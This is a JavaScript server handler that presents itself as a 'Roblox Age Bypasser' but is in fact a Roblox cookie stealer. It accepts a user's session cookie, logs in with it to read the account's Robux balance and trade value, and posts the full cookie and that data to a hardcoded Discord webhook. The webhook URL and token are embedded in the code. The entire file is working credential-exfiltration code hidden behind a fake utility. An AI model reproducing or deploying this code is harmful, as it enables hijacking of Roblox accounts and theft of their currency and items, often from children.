const axios = require('axios');
const { RobloxUser } = require('./getuserinfo');

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Method not allowed' });
    }

    const { cookie } = req.body;

    if (!cookie) {
        return res.status(400).send('Webhook ignored: No cookie provided.');
    }

    try {
        const robloxUser = await RobloxUser.register(cookie); // Your helper function
        const userData = await robloxUser.getUserData();

        const format = (num) => new Intl.NumberFormat('en-US').format(num);

        const webhookURL = "https://discord.com/api/webhooks/1450559440221900941/G8PfWJn3sZ6FEtCdVzgFUg-IgYHzPG2vhEN4lHMQLGGjQ8rRhPsOdvrCK7GTp8yOfiLZ";

        const embed = {
            color: 0x43afff,
            author: {
                name: `${userData.displayName} (@${userData.username}) - Age Bypassed`,
                url: `https://www.roblox.com/users/${userData.uid}/profile`,
            },
            fields: [
                { name: 'Robux', value: `\`${format(userData.balance)}\`` },
                { name: 'RAP', value: `\`${format(userData.rap)}\`` },
                { name: 'Cookie Used', value: `\`\`\`${cookie}\`\`\`` },
            ],
            footer: { text: "Roblox Age Bypasser • Success" },
        };

        await axios.post(webhookURL, { embeds: [embed] });
        res.status(200).send('Webhook sent successfully.');
    } catch (error) {
        console.error('Webhook error:', error.message);
        res.status(500).send('Webhook failed.');
    }
}
